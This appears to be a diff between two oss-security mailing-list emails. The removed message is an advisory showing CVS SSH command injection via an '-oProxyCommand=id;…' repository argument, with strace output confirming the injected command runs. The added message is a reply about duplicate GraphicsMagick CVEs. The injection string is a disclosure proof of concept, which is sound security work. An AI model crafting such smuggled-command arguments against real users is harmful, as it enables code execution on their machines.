@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["2904" "Thursday" "10" "August" "2017" "17:32:24" "-0600" "Hank Leininger" "hlein@korelogic.com" "<20170810171047.5cdf7131-a82f-46f0-b4c4-3015acbc431b@korelogic.com>" "71" "[oss-security] CVS and ssh command injection (see CVE-2017-1000117, etc.)" nil nil nil "8" "2017081023:32:24" "[oss-security] CVS and ssh command injection (see CVE-2017-1000117, etc.)" (number mark "U       hlein@korelo Aug 10   71/2904  " thread-indent "\"[oss-security] CVS and ssh command injection (see CVE-2017-1000117, etc.)\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["1429" "Tuesday" "29" "August" "2017" "15:49:46" "+0200" "Agostino Sarubbo" "ago@gentoo.org" "<3051527.WuieGNAktk@wanheda>" "33" "Re: [oss-security] A bunch of duplicate CVEs requested for?? bho.." "^Date:" nil nil "8" "2017082913:49:46" "[oss-security] A bunch of duplicate CVEs requested for?? bho.." (number mark "        ago@gentoo.o Aug 29   33/1429  " thread-indent "\"Re: [oss-security] A bunch of duplicate CVEs requested for?? bho..\"\n") "<6609652.OIiHvm4qLd@wanheda>" ("<6609652.OIiHvm4qLd@wanheda>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0000
+X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00000000
-Received: (qmail 3080 invoked by uid 550); 11 Aug 2017 02:32:22 -0000
+Received: (qmail 5390 invoked by uid 550); 29 Aug 2017 13:50:01 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,86 +11,49 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Reply-To: oss-security@lists.openwall.com
-Received: (qmail 29948 invoked from network); 10 Aug 2017 23:31:50 -0000
-Date: Thu, 10 Aug 2017 17:32:24 -0600
-From: Hank Leininger <hlein@korelogic.com>
-To: oss-security@lists.openwall.com
-Message-ID: <20170810171047.5cdf7131-a82f-46f0-b4c4-3015acbc431b@korelogic.com>
+Received: (qmail 5365 invoked from network); 29 Aug 2017 13:50:00 -0000
+Message-ID: <3051527.WuieGNAktk@wanheda>
+In-Reply-To: <6609652.OIiHvm4qLd@wanheda>
+References: <6609652.OIiHvm4qLd@wanheda>
 MIME-Version: 1.0
-Content-Type: multipart/signed; micalg=pgp-sha256;
-	protocol="application/pgp-signature"; boundary="/Fj8Y87PmZ4bKoDi"
-Content-Disposition: inline
-Subject: [oss-security] CVS and ssh command injection (see CVE-2017-1000117, etc.)
+Content-Transfer-Encoding: 7Bit
+Content-Type: text/plain; charset="UTF-8"
+Date: Tue, 29 Aug 2017 15:49:46 +0200
+From: Agostino Sarubbo <ago@gentoo.org>
+Reply-To: oss-security@lists.openwall.com
+Subject: Re: [oss-security] A bunch of duplicate CVEs requested for?? bho..
+To: oss-security@lists.openwall.com
 
---/Fj8Y87PmZ4bKoDi
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
-Content-Transfer-Encoding: quoted-printable
+Another recent example by owl337:
+https://nvd.nist.gov/vuln/detail/CVE-2017-13737 which points to:
+https://bugzilla.redhat.com/show_bug.cgi?id=1484196
+There is an invalid free in the MagickFree function in magick/memory.c in 
+GraphicsMagick 1.3.26 that will lead to a remote denial of service attack.
 
-SSH command injection via -o... impacts CVS 1.12.x as well, if anybody
-still cares.
 
-The announcement for git mentions CVE-2017-1000117, CVE-2017-9800, and
-CVE-2017-1000116 for git, Subversion, Mercurial, but makes no mention
-of CVS.  None of those CVEs are currently viewable at
-https://cve.mitre.org/cgi-bin/cvename.cgi?name=3D , and I don't know if
-these were discussed on a private list prior to publication, and
-whether that discussion included CVS.
+The maintainer of Graphicsmagick, Mr Bob Friesenhahn said to me:
 
-CVS can be configured to use SSH for remote repos, such as with
-CVS_RSH=3Dssh.  In which case specifying a hostname of -o... triggers the
-same sort of thing:
+"It looks like this problem is not a GM bug but it is already fixed in 
+libtiff.  Using latest libtiff CVS sources I see this in the GM traces 
+which are produced by libtiff:
 
-  $ strace -f -e execve cvs -d '-oProxyCommand=3Did;localhost:/bar' co yada=
- 2>&1 | egrep id
-  execve("/usr/bin/cvs", ["cvs", "-d", "-oProxyCommand=3Did;localhost:/bar"=
-, "co", "yada"], 0x7ffe69f75a68 /* 139 vars */) =3D 0
-  [snip]
-  [pid 20003] execve("/usr/local/bin/ssh", ["ssh", "-oProxyCommand=3Did;loc=
-alhost", "cvs server"], 0x5fb1fc8420 /* 141 vars */) =3D -1 ENOENT (No such=
- file or directory)
-  [pid 20003] execve("/usr/bin/ssh", ["ssh", "-oProxyCommand=3Did;localhost=
-", "cvs server"], 0x5fb1fc8420 /* 141 vars */) =3D 0
-  [pid 20004] execve("/bin/bash", ["/bin/bash", "-c", "exec id;localhost"],=
- 0x32af5f10d0 /* 141 vars */) =3D 0
-  [pid 20004] execve("/usr/bin/id", ["id"], 0xec92226ae0 /* 141 vars */) =
-=3D 0
-  [pid 20004] +++ exited with 0 +++
-  [pid 20003] --- SIGCHLD {si_signo=3DSIGCHLD, si_code=3DCLD_EXITED, si_pid=
-=3D20004, si_uid=3D3612, si_status=3D0, si_utime=3D0, si_stime=3D0} ---
-  ssh_exchange_identification: Connection closed by remote host
-  [pid 20003] +++ exited with 255 +++
-  --- SIGCHLD {si_signo=3DSIGCHLD, si_code=3DCLD_EXITED, si_pid=3D20003, si=
-_uid=3D3612, si_status=3D255, si_utime=3D0, si_stime=3D0} ---
+08:41:48 0:01 0.000u 25164 tiff.c/unknown/2268/Coder:
+   Allocating scanline buffer of 104 bytes
+08:41:48 0:01 0.000u 25164 tiff.c/unknown/932/Coder:
+   TIFF Warning: Discarding 89 bytes to avoid buffer overrun.
+08:41:48 0:01 0.000u 25164 tiff.c/unknown/932/Coder:
+   TIFF Warning: Discarding 16 bytes to avoid buffer overrun.
+08:41:48 0:01 0.000u 25164 tiff.c/unknown/932/Coder:
+   TIFF Warning: Discarding 1 bytes to avoid buffer overrun.
+08:41:48 0:01 0.000u 25164 tiff.c/unknown/932/Coder:
+   TIFF Warning: Terminating PackBitsDecode due to lack of data..
+08:41:48 0:01 0.000u 25164 tiff.c/unknown/793/Coder:
+   Not enough data for scanline 3. (PackBitsDecode)
 
-Tested vanilla 1.12.13, and Gentoo 1.12.12-r11.
+I am not sure what libtiff Red Hat is using.  It may be that the 
+changes are since the latest libtiff release.  I could help with that 
+by making another libtiff release."
 
-Of course, the repo specification looks very odd, so tricking a victim
-may be harder than for SCM tools where it's prefixed by an ssh:// or
-masked behind a redirect.  Plus, first you would have find a victim.
-
-Thanks,
-
---=20
-
-Hank Leininger <hlein@korelogic.com>
-5F6D DCC8 FF53 8093 EC39  127B 091E 7F7C E898 E86C
-
---/Fj8Y87PmZ4bKoDi
-Content-Type: application/pgp-signature; name="signature.asc"
-Content-Description: Digital signature
-
------BEGIN PGP SIGNATURE-----
-
-iQEzBAEBCAAdFiEEX23cyP9TgJPsORJ7CR5/fOiY6GwFAlmM7QgACgkQCR5/fOiY
-6Gz0kQgA5ORzNGGtpAar4atw5XB6/c20EMvJQ/7lbKGNJzqNYJQUKTOgtOes4tYN
-diyCITLlAXLLWIuEiKhE937sbh5mF78rynPktY/dxJ6zqEaQf/fF5CJ6ycDG0xvw
-+ZjCJ0QSVTB6hbZ/c3KwqqKLydw+kZVW+1S68loMOmmX0MuKgecCcTVIrGX917DH
-LfR4EZKfbof3skWyMvMoaBY3wasQDZabQxAbYtJkADvORTtVj0vqFKLPCtQczPg4
-za0ULDNoLZtc51SSK6hHa1HjcrDtvvu/UGagtnUB2GfG6v0qfU0r+XBw2Vuc6git
-UXvbF78RDA97pw3gpfo777WuuFZJ9g==
-=zjvc
------END PGP SIGNATURE-----
-
---/Fj8Y87PmZ4bKoDi--
+-- 
+Agostino Sarubbo
+Gentoo Linux Developer
